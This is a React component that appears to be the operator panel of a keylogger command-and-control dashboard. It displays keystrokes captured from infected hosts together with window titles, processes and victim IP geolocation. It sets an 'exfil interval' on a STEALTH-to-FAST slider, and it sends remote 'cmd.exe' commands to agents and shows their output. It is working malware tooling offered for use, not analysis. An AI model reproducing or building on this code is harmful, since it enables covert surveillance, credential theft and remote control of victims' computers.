import { useState, useCallback, useRef, useEffect } from "react";
import { AreaChart, Area, XAxis, YAxis, Tooltip, ResponsiveContainer } from "recharts";
import type { Agent, KeystrokeEntry, AgentConfig, CommandResult } from "../types";
import { api } from "../services/api";
import { getGeo } from "../services/geo";

interface AgentDetailPanelProps {
  agent: Agent;
  entries: KeystrokeEntry[];
  activityData: { hour: string; keystrokes: number }[];
  commandResults: CommandResult[];
  onDelete?: (id: string) => void;
  onSendCommand?: (cmd: string) => void;
  latestVersion?: string | null;
}

const TAG_COLORS = ["#58a6ff", "#3fb950", "#d29922", "#a855f7", "#22d3ee"];

export function AgentDetailPanel({ agent, entries, activityData, commandResults, onDelete, onSendCommand, latestVersion }: AgentDetailPanelProps) {
  const [exfilInterval, setExfilInterval] = useState(30);
  const [blacklistTags, setBlacklistTags] = useState<string[]>(["passwords", "banking"]);
  const [tagInput, setTagInput] = useState("");
  const [filterQuery, setFilterQuery] = useState("");
  const [syncState, setSyncState] = useState<"idle" | "syncing" | "synced" | "error">("idle");
  const [geo, setGeo] = useState<{ country: string; countryCode: string; city: string } | null>(null);
  const [geoDone, setGeoDone] = useState(false);
  const [commandInput, setCommandInput] = useState("");
  const [commandHistoryOpen, setCommandHistoryOpen] = useState(true);

  useEffect(() => {
    setGeo(null);
    setGeoDone(false);
    getGeo(agent.ip).then((result) => {
      if (result) setGeo({ country: result.country, countryCode: result.countryCode, city: result.city });
      setGeoDone(true);
    });
  }, [agent.ip]);

  const intervalDebounce = useRef<number | null>(null);
  const blacklistDebounce = useRef<number | null>(null);

  /* refs to avoid stale closures and races (bugs #8, #9, #10) */
  const agentIdRef = useRef(agent.id);
  agentIdRef.current = agent.id;
  const userTouched = useRef(false);
  const errorTimeout = useRef<number | null>(null);

  /* ── Sync config to backend (debounced) ── */

  const syncConfig = useCallback(
    (config: Partial<AgentConfig>) => {
      setSyncState("syncing");
      api.updateAgentConfig(agentIdRef.current, config)
        .then(() => setSyncState("synced"))
        .catch(() => {
          setSyncState("error");
          if (errorTimeout.current) clearTimeout(errorTimeout.current);
          errorTimeout.current = window.setTimeout(() => setSyncState("idle"), 3000);
        });
      setTimeout(() => setSyncState((s) => (s === "synced" ? "idle" : s)), 2000);
    },
    [] /* stable — uses agentIdRef */
  );

  /* ── Action handlers ── */

  const handleAgentAction = (action: string) => {
    api.sendAgentAction(agentIdRef.current, action).catch(() => {});
  };

  /* ── Load remote config on mount ── */
  const configLoaded = useRef(false);
  const fetchGeneration = useRef(0);

  useEffect(() => {
    configLoaded.current = false;
    userTouched.current = false;
    const gen = ++fetchGeneration.current;
    api.getAgentConfig(agent.id).then((config) => {
      if (gen !== fetchGeneration.current) return; /* stale */
      if (config.exfilIntervalSeconds !== undefined && !userTouched.current) {
        setExfilInterval(config.exfilIntervalSeconds);
      }
      if (config.blacklist && !userTouched.current) {
        setBlacklistTags(config.blacklist);
      }
      configLoaded.current = true;
    }).catch(() => {
      if (gen !== fetchGeneration.current) return; /* stale */
      configLoaded.current = true;
    });
  }, [agent.id]);

  useEffect(() => {
    if (intervalDebounce.current) clearTimeout(intervalDebounce.current);
    intervalDebounce.current = window.setTimeout(() => {
      if (configLoaded.current) {
        syncConfig({ exfilIntervalSeconds: exfilInterval } as AgentConfig);
      }
    }, 600);
    return () => {
      if (intervalDebounce.current) clearTimeout(intervalDebounce.current);
    };
  }, [exfilInterval, syncConfig]);

  useEffect(() => {
    if (blacklistDebounce.current) clearTimeout(blacklistDebounce.current);
    blacklistDebounce.current = window.setTimeout(() => {
      if (configLoaded.current) {
        syncConfig({ blacklist: blacklistTags } as AgentConfig);
      }
    }, 600);
    return () => {
      if (blacklistDebounce.current) clearTimeout(blacklistDebounce.current);
    };
  }, [blacklistTags, syncConfig]);

  /* ── Derived ── */

  const agentEntries = entries.filter((e) => e.agentId === agent.id);
  const filtered = filterQuery
    ? agentEntries.filter(
        (e) =>
          e.text.toLowerCase().includes(filterQuery.toLowerCase()) ||
          e.windowTitle.toLowerCase().includes(filterQuery.toLowerCase())
      )
    : agentEntries;

  const statusColor =
    agent.status === "active" ? "#3fb950" : agent.status === "idle" ? "#d29922" : "#f85149";

  return (
    <div className="flex flex-col h-full overflow-y-auto" style={{ scrollbarWidth: "thin", scrollbarColor: "#30363d #0d1117" }}>
      {/* Agent Header */}
      <div
        className="px-5 py-4 border-b flex-shrink-0"
        style={{ borderColor: "#30363d", backgroundColor: "#161b22" }}
      >
        <div className="flex items-center justify-between mb-1">
          <div className="flex items-center gap-2.5">
            <div
              className="w-2 h-2 rounded-full"
              style={{ backgroundColor: statusColor, boxShadow: `0 0 6px ${statusColor}` }}
            />
            <h2
              style={{
                color: "#e6edf3",
                fontFamily: "JetBrains Mono, monospace",
                fontSize: 15,
                fontWeight: 600,
              }}
            >
              {geo?.countryCode ? String.fromCodePoint(
                geo.countryCode.toUpperCase().charCodeAt(0) + 0x1F1E6 - 65,
                geo.countryCode.toUpperCase().charCodeAt(1) + 0x1F1E6 - 65,
              ) + ' ' : ''}{agent.hostname}
            </h2>
          </div>
          <span
            className="px-2 py-0.5 rounded"
            style={{
              backgroundColor: `${statusColor}1a`,
              color: statusColor,
              fontFamily: "JetBrains Mono, monospace",
              fontSize: 9,
              fontWeight: 600,
              letterSpacing: "0.1em",
            }}
          >
            {agent.status.toUpperCase()}
          </span>
        </div>
        <div className="flex gap-6 mt-2">
          {[
            { label: "IP", value: agent.ip },
            geo ? { label: "LOCATION", value: `${geo.city}, ${geo.country}` } : null,
            { label: "OS", value: agent.os },
            { label: "VERSION", value: `v${agent.version}` },
            { label: "LAST SEEN", value: agent.lastSeen },
            { label: "KEYSTROKES", value: agent.keystrokeCount.toLocaleString() },
          ].filter((item): item is NonNullable<typeof item> => item !== null && item.value !== null).map((item) => {
            const isVersion = item.label === "VERSION";
            const isLatest = isVersion && latestVersion && agent.version === latestVersion;
            const versionColor = isVersion ? (isLatest ? "#3fb950" : "#d29922") : undefined;
            return (
              <div key={item.label}>
                <div style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 9, letterSpacing: "0.05em" }}>
                  {item.label}
                </div>
                <div style={{
                  color: versionColor ?? "#e6edf3",
                  fontFamily: "JetBrains Mono, monospace",
                  fontSize: isVersion ? 10 : 11,
                }}>
                  {item.value}
                </div>
              </div>
            );
          })}
        </div>
      </div>

      <div className="flex gap-4 p-4 flex-1 min-h-0">
        {/* Left column: Config Controls */}
        <div className="flex flex-col gap-4 w-72 flex-shrink-0">
          {/* Exfil Interval */}
          <div
            className="rounded p-4"
            style={{ backgroundColor: "#161b22", border: "1px solid #30363d" }}
          >
            <div
              className="mb-3"
              style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 10, letterSpacing: "0.1em" }}
            >
              EXFIL INTERVAL
            </div>
            <div className="flex items-center justify-between mb-2">
              <span style={{ color: "#e6edf3", fontFamily: "JetBrains Mono, monospace", fontSize: 13, fontWeight: 600 }}>
                {exfilInterval}s
              </span>
              <span style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 10 }}>
                5s – 300s
              </span>
            </div>
            <input
              type="range"
              min={5}
              max={300}
              value={exfilInterval}
              onChange={(e) => { userTouched.current = true; setExfilInterval(Number(e.target.value)); }}
              className="w-full cursor-pointer"
              style={{ accentColor: "#58a6ff" }}
            />
            <div className="flex justify-between mt-1">
              <span style={{ color: "#30363d", fontFamily: "JetBrains Mono, monospace", fontSize: 9 }}>STEALTH</span>
              <span style={{ color: "#30363d", fontFamily: "JetBrains Mono, monospace", fontSize: 9 }}>FAST</span>
            </div>
          </div>

          {/* Blacklist Tags */}
          <div
            className="rounded p-4"
            style={{ backgroundColor: "#161b22", border: "1px solid #30363d" }}
          >
            <div
              className="mb-3"
              style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 10, letterSpacing: "0.1em" }}
            >
              WINDOW BLACKLIST
            </div>
            <div className="flex flex-wrap gap-1.5 mb-3">
              {blacklistTags.map((tag, i) => (
                <div
                  key={tag}
                  className="flex items-center gap-1 px-2 py-0.5 rounded"
                  style={{
                    backgroundColor: `${TAG_COLORS[i % TAG_COLORS.length]}1a`,
                    border: `1px solid ${TAG_COLORS[i % TAG_COLORS.length]}44`,
                  }}
                >
                  <span style={{ color: TAG_COLORS[i % TAG_COLORS.length], fontFamily: "JetBrains Mono, monospace", fontSize: 9 }}>
                    {tag}
                  </span>
                  <button
                    onClick={() => { userTouched.current = true; setBlacklistTags((tags) => tags.filter((t) => t !== tag)); }}
                    style={{ color: TAG_COLORS[i % TAG_COLORS.length], lineHeight: 1, fontSize: 12 }}
                  >
                    ×
                  </button>
                </div>
              ))}
            </div>
            <div className="flex gap-2">
              <input
                type="text"
                placeholder="add tag..."
                value={tagInput}
                onChange={(e) => setTagInput(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === "Enter" && tagInput.trim()) {
                    userTouched.current = true;
                    setBlacklistTags((tags) => [...tags, tagInput.trim()]);
                    setTagInput("");
                  }
                }}
                className="flex-1 bg-[#21262d] rounded px-2 py-1 outline-none placeholder-[#30363d]"
                style={{
                  border: "1px solid #30363d",
                  color: "#e6edf3",
                  fontFamily: "JetBrains Mono, monospace",
                  fontSize: 10,
                }}
              />
            </div>
          </div>

          {/* Agent Controls */}
          <div
            className="rounded p-4"
            style={{ backgroundColor: "#161b22", border: "1px solid #30363d" }}
          >
            <div
              className="mb-3"
              style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 10, letterSpacing: "0.1em" }}
            >
              AGENT CONTROLS
            </div>
            <div className="flex flex-col gap-2">
              <button
                onClick={() => handleAgentAction("sleep")}
                className="w-full py-2 rounded transition-colors hover:bg-[#d2992222] text-left px-3"
                style={{
                  backgroundColor: "#21262d",
                  border: "1px solid #30363d",
                  color: "#d29922",
                  fontFamily: "JetBrains Mono, monospace",
                  fontSize: 10,
                  letterSpacing: "0.05em",
                  cursor: "pointer",
                }}
              >
                ⏸ SLEEP AGENT
              </button>
              <button
                onClick={() => {
                  syncConfig({ exfilIntervalSeconds: exfilInterval } as AgentConfig);
                  handleAgentAction("sync");
                }}
                className="w-full py-2 rounded transition-colors hover:bg-[#58a6ff22] text-left px-3"
                style={{
                  backgroundColor: "#21262d",
                  border: syncState === "error" ? "1px solid #f85149" : "1px solid #30363d",
                  color: syncState === "error" ? "#f85149" : "#58a6ff",
                  fontFamily: "JetBrains Mono, monospace",
                  fontSize: 10,
                  letterSpacing: "0.05em",
                  cursor: "pointer",
                }}
              >
                {syncState === "syncing" ? "⟳ SYNCING..." :
                 syncState === "synced" ? "✓ SYNCED" :
                 syncState === "error" ? "✕ SYNC FAILED" :
                 "⟳ SYNC NOW"}
              </button>
              <button
                onClick={() => handleAgentAction("uninstall")}
                className="w-full py-2 rounded transition-colors hover:bg-[#f8514933] text-left px-3"
                style={{
                  backgroundColor: "#21262d",
                  border: "1px solid #f8514933",
                  color: "#f85149",
                  fontFamily: "JetBrains Mono, monospace",
                  fontSize: 10,
                  letterSpacing: "0.05em",
                  cursor: "pointer",
                }}
              >
                ✕ UNINSTALL
              </button>
              {onDelete && (
                <button
                  onClick={() => {
                    if (confirm(`Delete agent ${agent.hostname} from dashboard?`)) {
                      onDelete(agent.id);
                    }
                  }}
                  className="w-full py-2 rounded transition-colors hover:bg-[#f8514933] text-left px-3"
                  style={{
                    backgroundColor: "#21262d",
                    border: "1px solid #30363d",
                    color: "#8b949e",
                    fontFamily: "JetBrains Mono, monospace",
                    fontSize: 10,
                    letterSpacing: "0.05em",
                    cursor: "pointer",
                  }}
                >
                  🗑 DELETE FROM DASHBOARD
                </button>
              )}
            </div>
          </div>

          {/* Command Execution */}
          <div
            className="rounded p-4"
            style={{ backgroundColor: "#161b22", border: "1px solid #30363d" }}
          >
            <div
              className="mb-3"
              style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 10, letterSpacing: "0.1em" }}
            >
              COMMAND EXECUTION
            </div>
            <div className="flex gap-2 mb-2">
              <input
                type="text"
                placeholder="cmd.exe /c ..."
                value={commandInput}
                onChange={(e) => setCommandInput(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === "Enter" && commandInput.trim() && onSendCommand) {
                    onSendCommand(commandInput.trim());
                    setCommandInput("");
                    setCommandHistoryOpen(true);
                  }
                }}
                className="flex-1 bg-[#21262d] rounded px-2 py-1.5 outline-none placeholder-[#30363d]"
                style={{
                  border: "1px solid #30363d",
                  color: "#e6edf3",
                  fontFamily: "JetBrains Mono, monospace",
                  fontSize: 11,
                }}
              />
              <button
                onClick={() => {
                  if (commandInput.trim() && onSendCommand) {
                    onSendCommand(commandInput.trim());
                    setCommandInput("");
                    setCommandHistoryOpen(true);
                  }
                }}
                disabled={!commandInput.trim() || !onSendCommand}
                className="px-2.5 py-1.5 rounded transition-colors disabled:opacity-40"
                style={{
                  backgroundColor: commandInput.trim() && onSendCommand ? "#238636" : "#21262d",
                  border: "1px solid #30363d",
                  color: "#e6edf3",
                  fontFamily: "JetBrains Mono, monospace",
                  fontSize: 10,
                  cursor: commandInput.trim() && onSendCommand ? "pointer" : "not-allowed",
                }}
              >
                RUN
              </button>
            </div>

            {commandResults.length > 0 && (
              <div>
                <button
                  onClick={() => setCommandHistoryOpen(!commandHistoryOpen)}
                  className="w-full flex items-center justify-between py-1.5 px-2 rounded transition-colors hover:bg-[#21262d]"
                  style={{
                    color: "#8b949e",
                    fontFamily: "JetBrains Mono, monospace",
                    fontSize: 10,
                  }}
                >
                  <span>HISTORY ({commandResults.length})</span>
                  <span>{commandHistoryOpen ? "▲" : "▼"}</span>
                </button>

                {commandHistoryOpen && (
                  <div
                    className="mt-1 max-h-64 overflow-y-auto space-y-2"
                    style={{ scrollbarWidth: "thin", scrollbarColor: "#30363d #161b22" }}
                  >
                    {commandResults.slice(0, 20).map((result) => (
                      <div
                        key={result.id}
                        className="rounded p-2"
                        style={{
                          backgroundColor: "#0d1117",
                          border: "1px solid #30363d",
                        }}
                      >
                        <div
                          className="flex items-center justify-between mb-1"
                          style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 9 }}
                        >
                          <span className="truncate flex-1">{result.command}</span>
                          <span
                            className="ml-2 flex-shrink-0 px-1 rounded"
                            style={{
                              backgroundColor: result.exitCode === 0 ? "#3fb9501a" : "#f8514933",
                              color: result.exitCode === 0 ? "#3fb950" : "#f85149",
                            }}
                          >
                            {result.exitCode === 0 ? "OK" : `EXIT ${result.exitCode}`}
                          </span>
                        </div>
                        {result.stdout && (
                          <pre
                            className="mt-1 p-1.5 rounded overflow-x-auto text-xs leading-relaxed"
                            style={{
                              backgroundColor: "#161b22",
                              color: "#e6edf3",
                              fontFamily: "JetBrains Mono, monospace",
                              fontSize: 9,
                              maxHeight: 120,
                              overflowY: "auto",
                              whiteSpace: "pre-wrap",
                              wordBreak: "break-all",
                            }}
                          >
                            {result.stdout}
                          </pre>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}
          </div>
        </div>

        {/* Right column: Chart + Log */}
        <div className="flex flex-col gap-4 flex-1 min-w-0">
          {/* 24h Sparkline */}
          <div
            className="rounded p-4 flex-shrink-0"
            style={{ backgroundColor: "#161b22", border: "1px solid #30363d" }}
          >
            <div
              className="mb-3"
              style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 10, letterSpacing: "0.1em" }}
            >
              24H KEYSTROKE ACTIVITY
            </div>
            <div style={{ height: 120 }}>
              <ResponsiveContainer width="100%" height="100%">
                <AreaChart data={activityData} margin={{ top: 0, right: 0, left: -30, bottom: 0 }}>
                  <defs>
                    <linearGradient id="blueGrad" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#58a6ff" stopOpacity={0.3} />
                      <stop offset="95%" stopColor="#58a6ff" stopOpacity={0} />
                    </linearGradient>
                  </defs>
                  <XAxis
                    dataKey="hour"
                    tick={{ fill: "#30363d", fontFamily: "JetBrains Mono, monospace", fontSize: 8 }}
                    axisLine={{ stroke: "#30363d" }}
                    tickLine={false}
                    interval={3}
                  />
                  <YAxis
                    tick={{ fill: "#30363d", fontFamily: "JetBrains Mono, monospace", fontSize: 8 }}
                    axisLine={false}
                    tickLine={false}
                  />
                  <Tooltip
                    contentStyle={{
                      backgroundColor: "#21262d",
                      border: "1px solid #30363d",
                      borderRadius: 4,
                      fontFamily: "JetBrains Mono, monospace",
                      fontSize: 10,
                      color: "#e6edf3",
                    }}
                    labelStyle={{ color: "#8b949e" }}
                  />
                  <Area
                    type="monotone"
                    dataKey="keystrokes"
                    stroke="#58a6ff"
                    strokeWidth={1.5}
                    fill="url(#blueGrad)"
                    dot={false}
                  />
                </AreaChart>
              </ResponsiveContainer>
            </div>
          </div>

          {/* Filtered Log */}
          <div
            className="rounded flex flex-col flex-1 min-h-0"
            style={{ backgroundColor: "#161b22", border: "1px solid #30363d" }}
          >
            <div
              className="flex items-center justify-between px-3 py-2.5 border-b flex-shrink-0"
              style={{ borderColor: "#30363d" }}
            >
              <span
                style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 10, letterSpacing: "0.1em" }}
              >
                KEYSTROKE LOG — {filtered.length} ENTRIES
              </span>
              <input
                type="text"
                placeholder="filter..."
                value={filterQuery}
                onChange={(e) => setFilterQuery(e.target.value)}
                className="bg-[#21262d] rounded px-2 py-0.5 outline-none placeholder-[#30363d]"
                style={{
                  border: "1px solid #30363d",
                  color: "#e6edf3",
                  fontFamily: "JetBrains Mono, monospace",
                  fontSize: 10,
                  width: 120,
                }}
              />
            </div>
            <div
              className="flex-1 overflow-y-auto p-3 space-y-1"
              style={{ scrollbarWidth: "thin", scrollbarColor: "#30363d #161b22" }}
            >
              {filtered.slice(-100).map((entry) => (
                <div key={entry.id} className="flex items-start gap-3 group">
                  <span
                    className="flex-shrink-0"
                    style={{ color: "#30363d", fontFamily: "JetBrains Mono, monospace", fontSize: 9, marginTop: 2 }}
                  >
                    {entry.timestamp}
                  </span>
                  <span
                    className="px-1 rounded"
                    style={{
                      color: "#8b949e",
                      fontFamily: "JetBrains Mono, monospace",
                      fontSize: 9,
                      backgroundColor: "#0d1117",
                      flexShrink: 0,
                      marginTop: 1,
                    }}
                  >
                    {entry.process}
                  </span>
                  <span
                    style={{ color: "#e6edf3", fontFamily: "JetBrains Mono, monospace", fontSize: 11, wordBreak: "break-all" }}
                  >
                    {entry.text}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
